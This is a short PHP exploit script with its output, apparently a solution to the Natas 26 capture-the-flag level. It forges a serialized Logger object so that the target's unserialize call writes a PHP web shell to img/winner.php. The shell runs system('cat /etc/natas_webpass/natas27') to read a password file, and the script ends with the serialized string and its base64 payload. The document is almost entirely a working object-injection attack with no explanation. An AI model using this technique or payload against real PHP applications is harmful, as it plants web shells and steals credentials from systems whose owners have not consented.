
<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/winner.php";

        // write initial message
        $fd=fopen($this->logFile,"w+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }

}

$object = new Logger();

echo base64_encode((serialize($object)));

?>




saida_serialized = 'O:6:"Logger":3:{s:15:"LoggerlogFile";s:14:"img/winner.php";s:15:"LoggerinitMsg";s:50:"<?php system("cat /etc/natas_webpass/natas27"); ?>";s:15:"LoggerexitMsg";s:50:"<?php system("cat /etc/natas_webpass/natas27"); ?>";}'

saida_b64 = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30="
